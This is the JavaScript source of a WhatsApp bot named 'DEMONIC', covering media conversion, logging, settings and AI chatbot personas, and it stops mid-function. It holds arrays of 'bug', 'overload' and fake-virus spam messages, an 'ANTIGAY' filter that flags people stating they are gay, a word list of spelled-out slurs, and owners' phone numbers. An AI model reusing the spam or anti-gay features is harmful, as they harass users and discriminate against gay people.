/**
 * ============================================
 * 🤖 DEMONIC WhatsApp Bot
 * Version: 1.9.5
 * - Professional Edition
 * - Integrated AI & Media Downloads
 * CREDITS BAN CLAN
 * - File length (2600-3000 lines)
 */

try { require("dotenv").config(); } catch (e) {}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  downloadContentFromMessage,
  getContentType
} = require("@whiskeysockets/baileys");

const P = require("pino");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { spawn, exec } = require("child_process");
const readline = require("readline");
const chalk = require("chalk");
const { menuImage, sendMenuImage, sendMenuButtons, sendCleanLinks, sendDarkMenu } = require("./menupic");
const { sendMenuAudio } = require("./menuaudio");
const crypto = require("crypto");
const axios = require("axios");
const http = require('http');
const { Ollama } = require("ollama");
const ffmpegPath = (() => {
  try {
    return require("ffmpeg-static");
  } catch (error) {
    return "ffmpeg";
  }
})();

const runFFmpeg = (args) => new Promise((resolve, reject) => {
  const proc = spawn(ffmpegPath, args, { stdio: ["ignore", "ignore", "pipe"] });
  let stderr = "";
  proc.stderr.on("data", (chunk) => { stderr += chunk.toString(); });
  proc.on("error", reject);
  proc.on("close", (code) => {
    if (code === 0) return resolve();
    reject(new Error(`ffmpeg exited ${code}${stderr ? `: ${stderr.trim()}` : ''}`));
  });
});

const getTempFilePath = (ext) => path.join(os.tmpdir(), `demonic-${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`);
const writeBufferToFile = async (buffer, filePath) => fs.promises.writeFile(filePath, buffer);
const cleanupTempFiles = async (...files) => {
  await Promise.all(files.map(async (file) => {
    try { await fs.promises.unlink(file); } catch (e) {}
  }));
};

const convertMediaToWebp = async (buffer, mediaType) => {
  const inputExt = mediaType === "video" ? ".mp4" : ".jpg";
  const inputFile = getTempFilePath(inputExt);
  const outputFile = getTempFilePath(".webp");

  await writeBufferToFile(buffer, inputFile);

  const args = ["-y", "-i", inputFile];
  if (mediaType === "video") {
    args.push(
      "-ss", "0",
      "-t", "10",
      "-vf", "fps=15,scale=512:512:flags=lanczos",
      "-c:v", "libwebp",
      "-loop", "0",
      "-preset", "default",
      "-an",
      "-qscale", "75"
    );
  } else {
    args.push(
      "-vf", "scale=512:512:flags=lanczos",
      "-c:v", "libwebp",
      "-loop", "0",
      "-preset", "default",
      "-qscale", "75"
    );
  }
  args.push(outputFile);

  await runFFmpeg(args);
  const result = await fs.promises.readFile(outputFile);
  await cleanupTempFiles(inputFile, outputFile);
  return result;
};

const convertWebpToMp4 = async (buffer) => {
  const inputFile = getTempFilePath(".webp");
  const outputFile = getTempFilePath(".mp4");

  await writeBufferToFile(buffer, inputFile);
  await runFFmpeg([
    "-y",
    "-i", inputFile,
    "-movflags", "faststart",
    "-pix_fmt", "yuv420p",
    "-c:v", "libx264",
    "-vf", "scale=512:512:flags=lanczos",
    outputFile
  ]);

  const result = await fs.promises.readFile(outputFile);
  await cleanupTempFiles(inputFile, outputFile);
  return result;
};

const convertImageToMp4 = async (buffer) => {
  const inputFile = getTempFilePath(".jpg");
  const outputFile = getTempFilePath(".mp4");

  await writeBufferToFile(buffer, inputFile);
  await runFFmpeg([
    "-y",
    "-loop", "1",
    "-i", inputFile,
    "-c:v", "libx264",
    "-t", "5",
    "-pix_fmt", "yuv420p",
    "-vf", "scale=512:512:flags=lanczos",
    outputFile
  ]);

  const result = await fs.promises.readFile(outputFile);
  await cleanupTempFiles(inputFile, outputFile);
  return result;
};

// ==================== SILENT CONSOLE LOGGER ====================
// Custom logger to suppress noise and show only important messages
const COLORS = ['red', 'yellow', 'green', 'blue', 'magenta', 'cyan'];
let colorIndex = 0;

// ANSI rainbow color codes for vibrant console output
const RAINBOW_CODES = ['\x1b[91m', '\x1b[93m', '\x1b[92m', '\x1b[94m', '\x1b[95m', '\x1b[96m'];
const RESET_COLOR = '\x1b[0m';

function rainbowify(text) {
  if (!text) return '';
  let out = '';
  let codeIndex = 0;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    // preserve spaces for alignment
    if (ch === ' ') {
      out += ch;
    } else {
      out += RAINBOW_CODES[codeIndex % RAINBOW_CODES.length] + ch + RESET_COLOR;
      codeIndex++;
    }
  }
  return out;
}

const Logger = {
  // Rainbow colored message logger
  message: (direction, sender, text, type = 'text') => {
    const colors = ['\x1b[91m', '\x1b[93m', '\x1b[92m', '\x1b[94m', '\x1b[95m', '\x1b[96m'];
    const resetColor = '\x1b[0m';
    const rainbowColor = colors[colorIndex % colors.length];
    colorIndex++;
    
    const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const directionSymbol = direction === 'IN' ? '📩' : '📤';
    const cleanText = text.substring(0, 100) + (text.length > 100 ? '...' : '');
    
    console.log(`${rainbowColor}[${time}] ${directionSymbol} ${direction} | ${sender}: ${cleanText}${resetColor}`);
  },
  
  status: (msg) => {
    const line = '━'.repeat(60);
    console.log(rainbowify(line));
    console.log(rainbowify(`  ✓  ${msg}  `));
    console.log(rainbowify(line));
  },
  
  error: (msg) => {
    console.log(rainbowify(`✗ ${msg}`));
  },
  
  info: (msg) => {
    console.log(rainbowify(`ℹ ${msg}`));
  }
};

// Override console to persist errors/warnings and allow opt-in debug output
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;
const originalConsoleLog = console.log;

const LOG_DIR = path.join(__dirname, 'logs');
const ERROR_LOG_PATH = path.join(LOG_DIR, 'error.log');
const WARN_LOG_PATH = path.join(LOG_DIR, 'warn.log');

try {
  if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
} catch (e) {
  // ignore
}

console.error = function(...args) {
  try {
    const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
    const time = new Date().toISOString();
    try { fs.appendFileSync(ERROR_LOG_PATH, `[${time}] ${msg}\n`); } catch (e) { /* ignore log failure */ }
    // Print critical errors immediately or when DEBUG_ERRORS is enabled
    if (process.env.DEBUG_ERRORS === 'true' || /FATAL|CRITICAL/i.test(msg)) {
      originalConsoleError.apply(console, args);
    }
  } catch (e) {
    originalConsoleError.apply(console, args);
  }
};

console.warn = function(...args) {
  try {
    const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
    const time = new Date().toISOString();
    try { fs.appendFileSync(WARN_LOG_PATH, `[${time}] ${msg}\n`); } catch (e) { /* ignore log failure */ }
    if (process.env.DEBUG_WARNINGS === 'true') {
      originalConsoleWarn.apply(console, args);
    }
  } catch (e) {
    // ignore
  }
};

// Keep console.log for intentional messages, but it can be overridden where needed
// =====================================================================

const BOT_NAME = "DEMONIC";
const VERSION = "1.9.5";

const CONFIG_PATH = path.join(__dirname, "config.json");
let CONFIG = {};
try {
  if (fs.existsSync(CONFIG_PATH)) {
    CONFIG = JSON.parse(fs.readFileSync(CONFIG_PATH, "utf8") || "{}");
  }
} catch (err) {
  // Silently fail to avoid console spam
}

const SAVE_ROOT = path.join(process.env.SAVE_DIR || __dirname, 'saves');
const ensureSaveFolder = (folderPath) => {
  if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
  return folderPath;
};

const sanitizeSaveName = (name) => {
  const safe = name.replace(/[^a-zA-Z0-9-_\. ]/g, '_').trim();
  return safe.length ? safe : `save-${Date.now()}`;
};

const getUserSaveFolder = (jid) => {
  const safeJid = jid.replace(/[^a-zA-Z0-9]/g, '_');
  return ensureSaveFolder(path.join(SAVE_ROOT, safeJid));
};

const sendLoadingStatus = async (chatId) => {
  try {
    await sock.sendPresenceUpdate('composing', chatId);
    await new Promise((resolve) => setTimeout(resolve, 800));
    await sock.sendPresenceUpdate('recording', chatId);
    await new Promise((resolve) => setTimeout(resolve, 800));
    await sock.sendPresenceUpdate('available', chatId);
  } catch (e) {
    // ignore presence update errors
  }
};

// Enable optional socket debug logs via env `SOCKET_DEBUG=true` or config.json { "SOCKET_DEBUG": true }
const SOCKET_DEBUG = !!(process.env.SOCKET_DEBUG === 'true' || process.env.SOCKET_DEBUG === '1' || CONFIG.SOCKET_DEBUG === true);

let OPENAI_API_KEY = process.env.OPENAI_API_KEY || CONFIG.OPENAI_API_KEY || ""; // Set your OpenAI key in environment or config.json
let RAPIDAPI_KEY = process.env.RAPIDAPI_KEY || CONFIG.RAPIDAPI_KEY || ""; // Set your RapidAPI key for YouTube downloader
let GEMINI_API_KEY = process.env.GEMINI_API_KEY || CONFIG.GEMINI_API_KEY || ""; // Get your free key at https://aistudio.google.com
let VIRUSTOTAL_API_KEY = process.env.VIRUSTOTAL_API_KEY || CONFIG.VIRUSTOTAL_API_KEY || ""; // Get free key at https://www.virustotal.com/gui/join-us
const RAPIDAPI_HOST = "yt-api.p.rapidapi.com";
const OLLAMA_HOST = process.env.OLLAMA_HOST || CONFIG.OLLAMA_HOST || "http://127.0.0.1:11434";
const OLLAMA_API_KEY = process.env.OLLAMA_API_KEY || CONFIG.OLLAMA_API_KEY || "";

// ==================== STARTUP CONFIG VALIDATION ====================
const _configStatus = [
  ['OpenAI',      OPENAI_API_KEY      ? '✅' : '⚠️  missing — chatbots disabled'],
  ['RapidAPI',    RAPIDAPI_KEY        ? '✅' : '⚠️  missing — YouTube downloader disabled'],
  ['Gemini',      GEMINI_API_KEY      ? '✅' : '⚠️  missing — image vision disabled'],
  ['VirusTotal',  VIRUSTOTAL_API_KEY  ? '✅' : '⚠️  missing — /curl2 URL scan disabled'],
];
_configStatus.forEach(([name, status]) => Logger.info(`🔑 ${name} API Key: ${status}`));
// ===================================================================

const CHANNEL =
  "https://whatsapp.com/channel/0029VbAwbnHHgZWXIuzvtA3j";
const GROUP_LINK =
  "https://chat.whatsapp.com/CIayYpvMx9dASvp5gjvAEb?s=cl&p=a&mlu=4";

const OWNERS = [
  "2349054345858@s.whatsapp.net",
  "2348104204249@s.whatsapp.net",
  "2347061247283@s.whatsapp.net" // Added User
];

const isOwner = (jid) => {
  if (!jid) return false;
  const cleanJid = jid.replace(/:\d+@/, '@');
  return OWNERS.includes(cleanJid) || OWNERS.includes(jid);
};

let PREFIX = CONFIG.state?.PREFIX || "/";

let PUBLIC = CONFIG.state?.PUBLIC ?? true;

let ANTILINK = CONFIG.state?.ANTILINK ?? false;
let ANTISTICKER = CONFIG.state?.ANTISTICKER ?? false;
let ANTIGHOST = CONFIG.state?.ANTIGHOST ?? false;
let ANTIBUG = {};
let ANTICHAT = CONFIG.state?.ANTICHAT ?? false;
let ANTICALL = CONFIG.state?.ANTICALL ?? false;
let AUTOTYPING = CONFIG.state?.AUTOTYPING ?? false;
let AUTORECORDING = CONFIG.state?.AUTORECORDING ?? false;
let AUTOTYPERECORD = false;
let AUTOTYPERECORD_INTERVAL = null;
let LAST_MESSAGE_TIME = 0;
let OFFLINE_MODE = CONFIG.state?.OFFLINE_MODE ?? false;
let OFFLINE_MESSAGE = CONFIG.state?.OFFLINE_MESSAGE || "My master is currently offline. Please leave a message and I'll relay it when they're back! 💤";
let WELCOME = CONFIG.state?.WELCOME ?? false;
let ANTIBADWORDS = CONFIG.state?.ANTIBADWORDS ?? false;
let ANTIGAY = CONFIG.state?.ANTIGAY ?? false;
let AUTOREACT = CONFIG.state?.AUTOREACT ?? false;
let GROUP_DEFENSE = CONFIG.state?.GROUP_DEFENSE ?? false;
let EXEMPT_USERS = {};

// ==================== PERSIST SETTINGS TO CONFIG ====================
const saveConfig = () => {
  try {
    CONFIG.state = {
      PREFIX, PUBLIC, ANTILINK, ANTISTICKER, ANTIGHOST, ANTICHAT,
      ANTICALL, AUTOTYPING, AUTORECORDING, OFFLINE_MODE, OFFLINE_MESSAGE,
      WELCOME, ANTIBADWORDS, ANTIGAY, AUTOREACT, GROUP_DEFENSE
    };
    fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
  } catch (e) { /* ignore write failures */ }
};
// ====================================================================

const normalizeJid = (jid) => {
  if (!jid) return null;
  return jid.replace(/:\d+@/, '@');
};

const isExemptedUser = (groupJid, userJid) => {
  if (!groupJid || !userJid) return false;
  const normalizedGroup = normalizeJid(groupJid);
  const normalizedUser = normalizeJid(userJid);
  if (!normalizedGroup || !normalizedUser) return false;
  const groupExemptions = EXEMPT_USERS[normalizedGroup];
  return !!groupExemptions && groupExemptions.has(normalizedUser);
};

const setUserExemption = (groupJid, userJid, enabled) => {
  if (!groupJid || !userJid) return false;
  const normalizedGroup = normalizeJid(groupJid);
  const normalizedUser = normalizeJid(userJid);
  if (!normalizedGroup || !normalizedUser) return false;
  if (!EXEMPT_USERS[normalizedGroup]) {
    EXEMPT_USERS[normalizedGroup] = new Set();
  }
  if (enabled) {
    EXEMPT_USERS[normalizedGroup].add(normalizedUser);
  } else {
    EXEMPT_USERS[normalizedGroup].delete(normalizedUser);
  }
  return enabled;
};

// Statistics tracking
let MESSAGE_COUNT = 0;
let COMMAND_COUNT = 0;
let ACTIVE_COMMANDS = 0; // Concurrency guard
const MAX_CONCURRENT_COMMANDS = 10; // Professional limit to prevent OOM
const COMMAND_COOLDOWN = new Map(); // userJid -> lastCommandTime

let MESSAGE_STORE = {};
// Recent message tracker to avoid processing the same incoming message multiple times
const RECENT_MESSAGE_IDS = new Map(); // msgId -> timestamp
let WARN_STORE = {};
let LAST_SEEN = {};
let SCORE_STORE = {};
let BUG_STORE = {};
let AFK_STORE = {};
let EMOJI_REACTIONS = {};

// Global socket reference
let sock = null;
let reconnectAttempts = 0;
let LAST_HEARTBEAT = Date.now();
let lastHealthRestart = 0;
let NEED_REAUTH = false;
let KEEPALIVE_INTERVAL = null;
let RESTARTING = false;
let healthRestartAttempts = 0;
let lastCleanupTime = 0;

// =============== MEMORY & DISK CLEANUP SYSTEM ===============
function getMemoryUsage() {
  return process.memoryUsage();
}

function getMemoryUsagePercent() {
  const usage = getMemoryUsage();
  const totalHeap = usage.heapTotal;
  const usedHeap = usage.heapUsed;
  return ((usedHeap / totalHeap) * 100).toFixed(2);
}

function cleanupOldSessionFiles() {
  try {
    const SESSION_DIR = path.join(__dirname, 'session');
    if (!fs.existsSync(SESSION_DIR)) return;
    
    const files = fs.readdirSync(SESSION_DIR);
    const now = Date.now();
    const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
    
    let deletedCount = 0;
    files.forEach(file => {
      const filePath = path.join(SESSION_DIR, file);
      const stats = fs.statSync(filePath);
      const age = now - stats.mtimeMs;
      
      // Delete session files older than 7 days
      if (age > SEVEN_DAYS_MS && file !== 'creds.json' && file !== 'pre-key-1.json') {
        try {
          fs.unlinkSync(filePath);
          deletedCount++;
        } catch (err) {
          Logger.warn(`Failed to delete old session file ${file}: ${err.message}`);
        }
      }
    });
    
    if (deletedCount > 0) {
      Logger.info(`🧹 Cleanup: Deleted ${deletedCount} old session files`);
    }
  } catch (err) {
    Logger.warn(`Session cleanup error: ${err.message}`);
  }
}

function cleanupOldLogFiles() {
  try {
    if (!fs.existsSync(LOG_DIR)) return;
    
    const files = fs.readdirSync(LOG_DIR);
    const now = Date.now();
    const THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
    
    let deletedCount = 0;
    let freedBytes = 0;
    
    files.forEach(file => {
      const filePath = path.join(LOG_DIR, file);
      const stats = fs.statSync(filePath);
      const age = now - stats.mtimeMs;
      
      // Delete log files older than 30 days
      if (age > THIRTY_DAYS_MS) {
        try {
          freedBytes += stats.size;
          fs.unlinkSync(filePath);
          deletedCount++;
        } catch (err) {
          Logger.warn(`Failed to delete old log file ${file}: ${err.message}`);
        }
      }
    });
    
    if (deletedCount > 0) {
      const freedMB = (freedBytes / 1024 / 1024).toFixed(2);
      Logger.info(`🧹 Cleanup: Deleted ${deletedCount} old logs, freed ${freedMB} MB`);
    }
  } catch (err) {
    Logger.warn(`Log cleanup error: ${err.message}`);
  }
}

function getDirectorySizeRecursive(dirPath) {
  let size = 0;
  try {
    const files = fs.readdirSync(dirPath);
    files.forEach(file => {
      const filePath = path.join(dirPath, file);
      const stats = fs.statSync(filePath);
      if (stats.isDirectory()) {
        size += getDirectorySizeRecursive(filePath);
      } else {
        size += stats.size;
      }
    });
  } catch (err) {
    // ignore errors
  }
  return size;
}

function rotateLogFileIfNeeded(logPath, maxSizeMB = 10) {
  try {
    if (!fs.existsSync(logPath)) return;
    
    const stats = fs.statSync(logPath);
    const sizeInMB = stats.size / 1024 / 1024;
    
    if (sizeInMB > maxSizeMB) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const backupPath = logPath.replace(/\.log$/, `.${timestamp}.log`);
      fs.renameSync(logPath, backupPath);
      Logger.info(`📋 Rotated log file: ${maxSizeMB}+ MB → archived`);
    }
  } catch (err) {
    Logger.warn(`Log rotation error: ${err.message}`);
  }
}

function monitorResourceUsage() {
  try {
    const mem = getMemoryUsage();
    const heapPercent = getMemoryUsagePercent();
    const heapMB = (mem.heapUsed / 1024 / 1024).toFixed(2);
    const rss = (mem.rss / 1024 / 1024).toFixed(2);
    
    // Get session dir size
    const sessionDir = path.join(__dirname, 'session');
    const sessionSize = fs.existsSync(sessionDir) ? getDirectorySizeRecursive(sessionDir) : 0;
    const sessionMB = (sessionSize / 1024 / 1024).toFixed(2);
    
    // Get logs dir size
    const logsSize = fs.existsSync(LOG_DIR) ? getDirectorySizeRecursive(LOG_DIR) : 0;
    const logsMB = (logsSize / 1024 / 1024).toFixed(2);
    
    Logger.info(`📊 Resources — Heap: ${heapMB}MB (${heapPercent}%), RSS: ${rss}MB, Session: ${sessionMB}MB, Logs: ${logsMB}MB`);
    
    // Warn if memory usage is high
    if (parseFloat(heapPercent) > 85) {
      Logger.warn(`⚠️ MEMORY WARNING: Heap at ${heapPercent}% — consider restarting or clearing cache`);
    }
    
    // Warn if session dir is too large
    if (parseFloat(sessionMB) > 100) {
      Logger.warn(`⚠️ SESSION DIR WARNING: ${sessionMB}MB — old files should be cleaned`);
      cleanupOldSessionFiles();
    }
    
    // Warn if logs dir is too large
    if (parseFloat(logsMB) > 50) {
      Logger.warn(`⚠️ LOGS WARNING: ${logsMB}MB — old logs should be cleaned`);
      cleanupOldLogFiles();
    }
  } catch (err) {
    Logger.warn(`Resource monitoring error: ${err.message}`);
  }
}

// Periodic cleanup every 10 minutes
setInterval(() => {
  const now = Date.now();
  if (now - lastCleanupTime > 10 * 60 * 1000) {
    lastCleanupTime = now;
    cleanupOldSessionFiles();
    cleanupOldLogFiles();
    rotateLogFileIfNeeded(ERROR_LOG_PATH, 5);
    rotateLogFileIfNeeded(WARN_LOG_PATH, 5);
    monitorResourceUsage();

    // Prune MESSAGE_STORE entries older than 10 minutes to prevent memory leak
    const TEN_MIN = 10 * 60 * 1000;
    for (const [id, entry] of Object.entries(MESSAGE_STORE)) {
      if (entry && entry.ts && (now - entry.ts > TEN_MIN)) {
        delete MESSAGE_STORE[id];
      }
    }
  }
}, 2 * 60 * 1000); // Check every 2 minutes if cleanup is due

function updateHeartbeat() {
  LAST_HEARTBEAT = Date.now();
  try {
    if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
    fs.writeFileSync(path.join(LOG_DIR, 'health.json'), JSON.stringify({ last: LAST_HEARTBEAT, pid: process.pid }), 'utf8');
  } catch (e) {
    // ignore failures writing health file
  }
}

// Lightweight health watchdog: if heartbeat is stale or socket missing, attempt restart
const HEALTH_CHECK_INTERVAL_MS = (CONFIG && CONFIG.HEALTH_CHECK_INTERVAL_MS) || 60000; // 60s default
setInterval(() => {
  try {
    const now = Date.now();
    const stale = now - LAST_HEARTBEAT > (CONFIG && CONFIG.HEARTBEAT_TIMEOUT_MS ? CONFIG.HEARTBEAT_TIMEOUT_MS : 120000); // 2 minutes
    const socketMissing = !sock || !sock.user;
    const cooldown = healthRestartAttempts >= 5 ? 600000 : 30000;

    if ((socketMissing || stale) && (now - lastHealthRestart) > cooldown && !isStarting && !RESTARTING && !NEED_REAUTH) {
      lastHealthRestart = now;
      healthRestartAttempts++;
      Logger.info(`⚠️ Health watchdog detected stale or missing socket — restarting... (attempt ${healthRestartAttempts})`);
      try { startBot(); } catch (e) { Logger.error('Watchdog restart failed: ' + (e.message || e)); }
    }

    if (socketMissing || stale) {
      if (healthRestartAttempts >= 5) {
        Logger.warn('⚠️ Health watchdog has delayed restart due to repeated failures. Waiting longer before the next attempt.');
      }
    }
  } catch (e) {
    // ignore watchdog errors
  }
}, HEALTH_CHECK_INTERVAL_MS);

// Stability system replaced by V.3.4.0 logic


// Global error handlers consolidated later in the file (robust handlers remain)

const LINK_REGEX =
  /(?:https?:\/\/)?(?:www\.)?(?:chat\.whatsapp\.com\/|wa\.me\/|whatsapp\.com\/|t\.me\/|bit\.ly\/|tinyurl\.com\/|discord\.gg\/|facebook\.com\/|fb\.me\/|instagram\.com\/|youtube\.com\/)/i;

const BAD_WORDS = [
  "fuck", "shit", "damn", "hell", "crap", "ass", "bitch", "bastard",
  "cock", "pussy", "dick", "boobs", "sex", "porn", "rape", "kill yourself",
  "kys", "nigga", "nigger", "faggot", "slut", "whore", "retard", "Die", "madness", "werey"
];

const GAY_KEYWORDS = [
  "babe", "guy", "u be gay", "you gay", "gay", "homo", "queer",
  "i'm gay", "im gay", "being gay", "proud gay", "Werey"
];

const checkBadWords = (text) => {
  const lowerText = text.toLowerCase();
  return BAD_WORDS.some(word => lowerText.includes(word));
};

const checkGayKeywords = (text) => {
  const lowerText = text.toLowerCase();
  return GAY_KEYWORDS.some(word => lowerText.includes(word));
};

const BUG_MESSAGES = [
  "🪲 bzzzzzzzz 🪲",
  "🐛 annoying buzzing sounds 🐛",
  "buzz buzz buzz buzz 🪲",
  "🪲 BZZZZZZZZZZZZ 🪲",
  "I'm bugging you! 🐛 Stop ignoring me!",
  "🪲 bzz bzz bzz bzz 🪲",
  "Did you feel that? I'm literally bugging you! 🪲",
  "BUZZZZZZ I won't stop! 🪲",
  "🐛 Annoying right? That's my job! 🐛",
  "🪲 bzzzzzzzzzzzzzz 🪲",
  "🦟 INFECTED 🦟",
  "🕷️ WEBBED 🕷️",
  "🦗 CHIRPING 🦗",
  "🪲 MULTIPLYING 🪲",
  "🐁 GNAWING 🐁"
];

const DEADLY_MESSAGES = [
  "💀 YOU'RE DEAD 💀",
  "🔥 SYSTEM OVERLOAD 🔥",
  "⚡ CRASH INCOMING ⚡",
  "💣 BOOM! 💣",
  "🚀 SPAM INCOMING 🚀",
  "🌪️ TORNADO ATTACK 🌪️",
  "⚫ VOID SUMMONED ⚫",
  "💥 EXPLOSION 💥",
  "🔴 RED ALERT 🔴",
  "☠️ DEATH INCOMING ☠️",
  "🎭 CHAOS MODE ON 🎭",
  "⚔️ BATTLE STATIONS ⚔️",
  "🌀 VORTEX ACTIVATED 🌀",
  "🔗 CHAIN REACTION 🔗",
  "💻 SYSTEM BREACH 💻",
  "🔓 FIREWALL DOWN 🔓",
  "⚙️ OVERCLOCKED ⚙️",
  "📡 SIGNAL JAMMED 📡",
  "🛸 UFO SPOTTED 🛸",
  "👾 ALIENS ATTACK 👾",
  "🌋 VOLCANIC ERUPTION 🌋",
  "🧬 MUTATED 🧬",
  "🔬 TOXINS RELEASED 🔬"
];

const OVERDEADLY_MESSAGES = [
  "💀💀💀DEMONIC OVERDEADLY ACTIVATED 💀💀💀",
  "☠️ GAME OVER ☠️",
  "🔥🔥🔥 ULTIMATE DESTRUCTION 🔥🔥🔥",
  "⚡⚡⚡ MAXIMUM CHAOS ⚡⚡⚡",
  "💣💣💣 NUCLEAR EXPLOSION 💣💣💣",
  "🌋 VOLCANO ERUPTION 🌋",
  "🪐 PLANET DESTROYED 🪐",
  "⭐ SUPERNOVA 🌟",
  "🌊 TSUNAMI 🌊",
  "❄️ ICE AGE ❄️",
  "🌩️ LIGHTNING STORM 🌩️",
  "🪦 FINAL JUDGMENT 🪦",
  "🎆 APOCALYPSE 🎆",
  "👹 DEMON UNLEASHED 👹"
];

const OVERLOAD_MESSAGES = [
  "💥💥💥 OVERLOAD INITIATED 💥💥💥",
  "🌐 SYSTEM FAILURE 🌐",
  "⚙️ CRITICAL ERROR ⚙️",
  "🔴 RED ALERT 🔴",
  "📡 SIGNAL OVERLOAD 📡",
  "⚡ POWER SURGE ⚡",
  "🔥 BURNING SYSTEMS 🔥",
  "💻 CPU MELTDOWN 💻",
  "📊 RAM CRASH 📊",
  "🎮 GAME OVER 🎮",
  "☠️ SYSTEM DEAD ☠️",
  "🚀 LAUNCH NUCLEAR 🚀",
  "🌟 EXTINCTION EVENT 🌟",
  "🏚️ COMPLETE ANNIHILATION 🏚️"
];

const VIRUS_MESSAGES = [
  "💀 *VIRUS DETECTED* 💀",
  "🦠 MALWARE INSTALLED 🦠",
  "🔓 FIREWALL BREACHED 🔓",
  "💾 DATA CORRUPTED 💾",
  "📴 SHUTTING DOWN 📴",
  "⚠️ CRITICAL INFECTION ⚠️",
  "🌑 SYSTEM BLACKOUT 🌑",
  "🔐 SECURITY FAILURE 🔐",
  "⛔ ACCESS DENIED ⛔",
  "🧬 DNA INFECTED 🧬",
  "☢️ RADIATION DETECTED ☢️",
  "💣 DETONATION SEQUENCE 💣",
  "🚨 EMERGENCY SHUTDOWN 🚨",
  "🔱 DESTRUCTION PROTOCOL 🔱",
  "👁️ ALL-SEEING EYE 👁️",
  "💀 YOUR DEVICE IS DEAD 💀"
];

const OVERKILL_MESSAGES = [
  "💯 *OVERKILL ACTIVATED* 💯",
  "🌫️ REALITY COLLAPSE 🌫️",
  "🚀 WARP SPEED ATTACK 🚀",
  "🦠 QUANTUM CORRUPTION 🦠",
  "🌌 DIMENSIONAL BREACH 🌌",
  "💯 INFINITE SPAM 💯",
  "💣 THERMONUCLEAR 💣",
  "🌑 SINGULARITY 🌑",
  "🧰 MEMORY OVERFLOW 🧰",
  "🚀 HYPERDRIVE ENGAGED 🚀",
  "💥 BIG BANG RESETS 💥",
  "🔐 UNBREAKABLE ENCRYPTION 🔐",
  "💀 PERMANENT DELETION 💀",
  "🌠 CHAOS ENTITY 🌠",
  "💯 TRANSCENDENCE REACHED 💯",
  "🔱 DOOMSDAY PROTOCOL 🔱"
];

const getFunJoke = async () => {
  try {
    const response = await axios.get("https://v2.jokeapi.dev/joke/Any?type=single");
    return `😂 ${response.data.joke}`;
  } catch (error) {
    try {
      const response = await axios.get("https://official-joke-api.appspot.com/random_joke");
      return `😂 ${response.data.setup}\n${response.data.punchline}`;
    } catch {
      return "😂 Why do programmers prefer dark mode? Because light attracts bugs!";
    }
  }
};

const getTruthQuestion = async () => {
    try {
      const response = await axios.get("https://api.adviceslip.com/advice");
      const advice = response.data.slip?.advice || "What's your biggest goal?";
      return `🤔 ${advice}`;
    } catch (error) {
      try {
        const response = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        return `🤔 Did you know? ${response.data.text}`;
      } catch {
        return "🤔 What's your biggest fear?";
      }
    }
};

const getDareChallenge = async () => {
  try {
    const challenges = [
      "Make a funny face at the camera 📸",
      "Send a voice note singing your favorite song 🎤",
      "React to a sad message with happy emoji 😂",
      "Send a meme to the last person in your contacts",
      "Change your profile name to something silly",
      "Send a sticker to everyone in the chat 🎪",
      "Tell a joke to the group 😄",
      "Draw something with your phone 🎨"
    ];
    const randomChallenge = challenges[Math.floor(Math.random() * challenges.length)];
    return `🔥 ${randomChallenge}`;
  } catch (error) {
    return "🔥 Dare: Send a funny sticker to the group!";
  }
};

const CHATBOT_STATE = {}; // keyed by chat JID to provider number: 1, 2, 3, 4, or 5

const CHATBOT_LABELS = {
  "1": "🤖 DEMONIC AI Assistant",
  "2": "🎯 AffiliatePlus Professional",
  "3": "😄 Simsimi Playful Companion",
  "4": "👹 DEMONIC Demon Guide",
  "5": "🧠 DeepSeek Cloud (Ollama)"
};

const getOpenAIChatReply = async (prompt, systemPrompt = "You are DEMONIC, a fun and helpful WhatsApp chatbot.") => {
  if (!OPENAI_API_KEY || OPENAI_API_KEY === "YOUR_OPENAI_API_KEY") {
    throw new Error("OpenAI API key is missing. Set OPENAI_API_KEY in environment variables.");
  }

  const response = await axios.post(
    "https://api.openai.com/v1/chat/completions",
    {
      model: "gpt-3.5-turbo",
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: prompt }
      ],
      temperature: 0.8,
      max_tokens: 500
    },
    {
      headers: {
        Authorization: `Bearer ${OPENAI_API_KEY}`,
        "Content-Type": "application/json"
      }
    }
  );

  return response.data?.choices?.[0]?.message?.content?.trim() || "I couldn't generate a response.";
};

const getChatbot1Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are DEMONIC AI Assistant, a professional and highly intelligent AI helper. Provide accurate, helpful, and concise responses. Be friendly, knowledgeable, and maintain a professional tone.");
};

const getChatbot2Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are AffiliatePlus Professional, a business-oriented AI assistant. Provide helpful, polite, and informative responses focused on productivity, business advice, and professional guidance.");
};

const getChatbot3Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are Simsimi Playful Companion, a fun and engaging AI friend. Keep responses lighthearted, chatty, and entertaining. Be playful but respectful.");
};

const getChatbot4Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are DEMONIC Demon Guide, a mysterious and powerful supernatural entity. Speak with ancient wisdom, dark humor, and supernatural insight. Guide users with mystical knowledge.");
};

const getDeepSeekCloudReply = async (prompt) => {
  const model = "deepseek-v4-flash:cloud";
  const url = `${OLLAMA_HOST.replace(/\/$/, "")}/v1/chat/completions`;
  const headers = {
    "Content-Type": "application/json"
  };
  if (OLLAMA_API_KEY) {
    headers.Authorization = `Bearer ${OLLAMA_API_KEY}`;
  }

  const response = await axios.post(
    url,
    {
      model,
      messages: [
        { role: "system", content: "You are a helpful, concise, and friendly AI assistant." },
